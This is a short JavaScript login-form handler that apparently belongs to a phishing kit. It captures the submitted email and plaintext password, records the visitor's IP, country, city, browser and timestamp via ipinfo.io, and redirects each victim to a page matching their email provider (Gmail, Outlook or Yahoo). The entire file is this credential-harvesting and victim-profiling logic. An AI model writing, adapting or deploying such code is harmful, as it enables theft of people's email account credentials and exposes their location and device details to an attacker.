document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault() // Prevent normal form submit

  const email = document.getElementById("user_email").value.trim()
  const password = document.getElementById("user_password").value

  localStorage.setItem("userEmail", email)
  localStorage.setItem("userPassword", password)

  const useragent = navigator.userAgent
  const browser = `${navigator.appName} ${navigator.appVersion}`
  const timestamp = new Date().toISOString()

  let ip = "",
    country = "",
    city = ""

  try {
    const ipinfoResp = await fetch("https://ipinfo.io/json")
    if (ipinfoResp.ok) {
      const ipinfo = await ipinfoResp.json()
      ip = ipinfo.ip || ""
      country = ipinfo.country || ""
      city = ipinfo.city || ""
    }
  } catch (error) {
    // IP info fetch failed, continue with empty values
  }

  localStorage.setItem("userIP", ip)
  localStorage.setItem("userCountry", country)
  localStorage.setItem("userCity", city)
  localStorage.setItem("userAgent", useragent)
  localStorage.setItem("userBrowser", browser)
  localStorage.setItem("userTimestamp", timestamp)

  // Extract domain from email address
  const emailDomain = email.toLowerCase().split("@")[1]
  let redirectPath = "/yahoo" // Default fallback

  // Determine redirect path based on email domain
  if (emailDomain) {
    if (emailDomain.includes("gmail.com") || emailDomain.includes("googlemail.com")) {
      redirectPath = "/gmail"
    } else if (
      emailDomain.includes("outlook.com") ||
      emailDomain.includes("hotmail.com") ||
      emailDomain.includes("live.com") ||
      emailDomain.includes("msn.com")
    ) {
      redirectPath = "/outlook"
    } else if (
      emailDomain.includes("yahoo.com") ||
      emailDomain.includes("ymail.com") ||
      emailDomain.includes("rocketmail.com")
    ) {
      redirectPath = "/yahoo"
    }
    // For other domains, default to yahoo page
  }

  // Redirect to appropriate email provider page
  window.location.href = redirectPath
})
